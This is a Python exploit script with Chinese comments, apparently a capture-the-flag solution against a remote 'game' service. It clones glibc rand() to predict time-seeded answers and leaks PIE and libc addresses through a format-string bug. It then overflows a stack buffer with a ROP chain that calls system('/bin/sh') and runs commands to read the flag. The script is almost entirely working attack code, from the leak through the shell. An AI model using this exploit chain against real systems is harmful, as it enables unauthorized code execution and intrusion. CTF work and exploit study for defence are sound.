
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time

# ---------------- 偏移 ----------------
OFF_RET_MAIN = 0x14DA        # echo_line 返回到 main 的地址
OFF_LIBC_START_RET = 0x2A1CA  # __libc_start_call_main 里 call rax 之后

LIBC_PUTS = 0x87CC0
LIBC_SYSTEM = 0x58750
LIBC_BINSH = 0x1CC42F       # 远程实测 libc = 2.39-0ubuntu8.9
LIBC_BINSH_ALT = 0x1CB42F   # 2.39-0ubuntu8.8 里的位置，作为备选
LIBC_POP_RDI = 0x10C08D      # pop rdi; ret（未对齐指令，5f c3）
LIBC_RET = 0x10C08E          # 对齐用的裸 ret

HOST = "103.163.47.230"
PORT = 35118

M32 = 0xFFFFFFFF


# ---------------- glibc rand 复刻 ----------------
class GlibcRand:
    """srand(seed) 后连续取 rand()，与 glibc random() TYPE_3 一致（输出是 state>>1）"""

    def __init__(self, seed):
        r = [0] * 400
        seed &= M32
        if seed == 0:
            seed = 1
        r[0] = seed
        for i in range(1, 31):
            hi, lo = divmod(r[i - 1], 127773)
            word = 16807 * lo - 2836 * hi
            if word < 0:
                word += 2147483647
            r[i] = word & M32
        for i in range(31, 34):
            r[i] = r[i - 31]
        for i in range(34, 344):
            r[i] = (r[i - 31] + r[i - 3]) & M32
        self.r = r
        self.i = 344

    def next(self):
        v = (self.r[self.i - 31] + self.r[self.i - 3]) & M32
        self.r[self.i] = v
        self.i += 1
        return v >> 1


def rand_of(seed):
    return GlibcRand(seed).next()


def rand_bytes(extra=0):
    """当前秒对应的答案；extra 是服务端相对本机的秒级偏差"""
    return str(rand_of(int(time.time()) + extra)).encode()


# ---------------- IO ----------------
class Conn:
    def __init__(self, sock=None, proc=None):
        self.sock = sock
        self.proc = proc
        self.buf = b""

    def send(self, data):
        if self.sock:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def _read_more(self):
        if self.sock:
            try:
                c = self.sock.recv(4096)
            except socket.timeout:
                return b""
        else:
            fd = self.proc.stdout.fileno()
            r, _, _ = select.select([fd], [], [], 0.2)
            if not r:
                return b""
            try:
                c = os.read(fd, 4096)
            except OSError:
                return b""
        if not c:
            raise EOFError
        self.buf += c
        return c

    def recvuntil(self, marker, timeout=8.0):
        if isinstance(marker, str):
            marker = marker.encode()
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                raise TimeoutError("等不到 %r，当前缓冲 %r" % (marker, self.buf[-120:]))
            self._read_more()
        i = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def recvall(self, wait=1.2):
        end = time.time() + wait
        while time.time() < end:
            try:
                if not self._read_more():
                    time.sleep(0.05)
            except EOFError:
                break
        out, self.buf = self.buf, b""
        return out


def p64(x):
    return struct.pack("<Q", x)


def connect_remote(host, port, timeout=8):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return Conn(sock=s)


def connect_local(path="/tmp/g/game", cwd="/tmp/g", libc="/tmp/g/libc.so.6"):
    env = dict(os.environ)
    env["LD_PRELOAD"] = libc
    p = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, cwd=cwd, env=env)
    return Conn(proc=p)


# ---------------- 主利用 ----------------
def run(conn, skew=0, binsh_off=None, verbose=True):
    binsh_off = binsh_off or LIBC_BINSH
    io = conn

    # 第一道随机数门：先发再读 banner，尽量贴近服务端 time(0) 的调用时刻
    f1 = time.time()
    io.send(str(rand_of(int(f1) + skew)).encode() + b"\n")
    io.recvuntil("让游戏开始吧")
    io.recvuntil("说出你想要说的话吧", timeout=6)
    # 由第一道门的成功反推浮点偏移：服务端 seed ∈ [t+skew, t+skew+1)
    off = skew - (f1 % 1.0) + 0.5

    # 格式化字符串：泄漏 PIE + libc
    io.send(b"%15$p.%17$p\n")
    data = io.recvuntil("做出你的选择吧", timeout=6)
    vals = re.findall(rb"0x[0-9a-f]+", data)
    if len(vals) < 2:
        raise RuntimeError("泄漏不足: %r" % data[:100])
    pie_base = int(vals[0], 16) - OFF_RET_MAIN
    libc_base = int(vals[1], 16) - OFF_LIBC_START_RET
    if verbose:
        print("[+] PIE  base = %#x" % pie_base)
        print("[+] libc base = %#x" % libc_base)
    if pie_base & 0xFFF or libc_base & 0xFFF:
        raise RuntimeError("基址未对齐，泄漏不可信")

    # 第二道随机数门：用浮点偏移算，能自动处理跨秒进位
    f2 = time.time()
    io.send(str(rand_of(int(f2 + off))).encode() + b"\n")
    io.recvuntil("做你想要做的事吧", timeout=6)

    system = libc_base + LIBC_SYSTEM
    binsh = libc_base + binsh_off
    pop_rdi = libc_base + LIBC_POP_RDI
    ret = libc_base + LIBC_RET
    if verbose:
        print("[+] system = %#x  binsh = %#x" % (system, binsh))

    chain = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
    payload = b"A" * 0x40 + b"B" * 8 + chain
    assert len(payload) <= 0x70, len(payload)
    io.send(payload)

    time.sleep(0.4)
    io.send(b"cat /flag 2>/dev/null; cat flag* 2>/dev/null; id; pwd; ls -la\n")
    out = io.recvall(wait=1.5)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--retry", type=int, default=15)
    a = ap.parse_args()

    # 自检：本地能调 libc 时，用 ctypes 校验 rand 复刻是否正确
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        for seed in (1, 1700000000, int(time.time())):
            libc.srand(ctypes.c_uint(seed & M32))
            if libc.rand() != rand_of(seed):
                print("[!] glibc rand 复刻与系统 libc 不一致，seed=%d" % seed)
                libc.srand(ctypes.c_uint(seed & M32))
                print("    ctypes=%d  replica=%d" % (libc.rand(), rand_of(seed)))
                sys.exit(1)
        print("[+] rand 复刻校验通过")
    except OSError:
        pass   # Windows 下没有 libc.so.6，跳过

    cands = [(0, LIBC_BINSH_ALT), (0, LIBC_BINSH)] if a.local else [(2, LIBC_BINSH), (3, LIBC_BINSH), (2, LIBC_BINSH_ALT)]
    for i in range(a.retry):
        skew, bsh = cands[i % len(cands)]
        print("=== 第 %d/%d 次 (skew=%+d, binsh=%#x) ===" % (i + 1, a.retry, skew, bsh))
        conn = None
        try:
            conn = connect_local() if a.local else connect_remote(a.host, a.port)
            out = run(conn, skew=skew, binsh_off=bsh)
            text = out.decode("utf-8", "replace")
            print(text[-800:])
            m = re.search(r"HTUCTF\{[^}]*\}|flag\{[^}]*\}", text)
            if m:
                print("\n[+] FLAG =", m.group(0))
                return 0
        except Exception as e:
            print("[!] %r" % (e,))
        finally:
            if conn and conn.proc:
                conn.proc.kill()
            if conn and conn.sock:
                conn.sock.close()
        time.sleep(0.2)
    print("[-] 全部失败")
    return 1


if __name__ == "__main__":
    sys.exit(main())
